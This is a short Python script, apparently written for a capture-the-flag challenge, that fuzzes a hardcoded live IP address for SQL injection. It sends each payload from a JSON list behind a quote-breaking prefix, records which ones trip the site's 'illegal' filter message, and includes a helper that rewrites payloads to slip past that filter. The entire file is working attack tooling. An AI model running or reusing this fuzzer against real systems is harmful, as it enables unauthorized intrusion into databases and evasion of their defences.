import json
from requests_html import HTMLSession

url = 'http://1.14.71.254:28038/'
prefix = """1'"""
cmd = 'wllm'
method = 'get'
exclude = '非法'
s = HTMLSession()

work_lst = []
fuz_lst = []
def main():
    obj = init()
    for key, value, in obj.items():
        value = prefix + value
        if method == 'get':
            res = s.get(f'{url}?{cmd}={value}')
        else:
            res = s.post(url, data={cmd: value})

        if exclude and exclude in res.text:
            print('exclude', key, value)
            fuz_lst.append(key)
            continue
        print(key.center(24, '-') + '\n')
        # print(key.center(24, '-') + '\n', res.text)
        work_lst.append(key)


def init():
    jso = open('sql_fuzz.json', 'r').read()
    r = json.loads(jso)
    return r

def repl(payload):
    import re
    from re import  escape
    obj = init()
    for k, v in obj.items():
        payload = re.sub(escape(k), escape(v), payload, flags=re.IGNORECASE)
    return payload.replace('\\', '')


if __name__ == '__main__':
    main()
    print('fuz list is ', fuz_lst)
    print('work list is ', work_lst)
